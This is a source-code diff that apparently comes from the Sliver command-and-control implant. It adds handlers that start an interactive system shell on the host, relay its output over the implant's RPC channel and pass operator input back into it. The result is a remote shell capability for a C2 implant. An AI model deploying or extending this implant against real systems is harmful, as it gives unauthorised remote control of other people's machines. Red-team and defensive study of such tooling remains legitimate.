@@ -17,6 +17,7 @@ import (
 	pb "sliver/protobuf/sliver"
 	"sliver/sliver/procdump"
 	"sliver/sliver/ps"
+	"sliver/sliver/shell"
 
 	"github.com/golang/protobuf/proto"
 )
@@ -309,6 +310,37 @@ func dumpHandler(data []byte, resp RPCResponse) {
 	}
 	data, err = proto.Marshal(dumpResp)
 	resp(data, err)
+}
+
+func startShellHandler(data []byte, resp RPCResponse) {
+	shellPath := shell.GetSystemShellPath()
+	send := make(chan []byte)
+	recv := make(chan []byte)
+
+	newShell := shell.StartInteractive(shellPath, send, recv)
+	shell.Shells.AddShell(newShell)
+
+	data, err := proto.Marshal(&pb.ShellData{
+		ID: newShell.ID,
+	})
+	resp(data, err)
+
+	for shellData := range newShell.Recv {
+		data, err := proto.Marshal(&pb.ShellData{
+			ID:     newShell.ID,
+			Stdout: shellData,
+		})
+		resp(data, err)
+	}
+}
+
+func shellDataHandler(data []byte, resp RPCResponse) {
+	shellData := &pb.ShellData{}
+	proto.Unmarshal(data, shellData)
+	if shellData.Close {
+		shell.Shells.Close(shellData.ID)
+	}
+	shell.Shells.WriteData(shellData)
 }
 
 // ---------------- Data Encoders ----------------
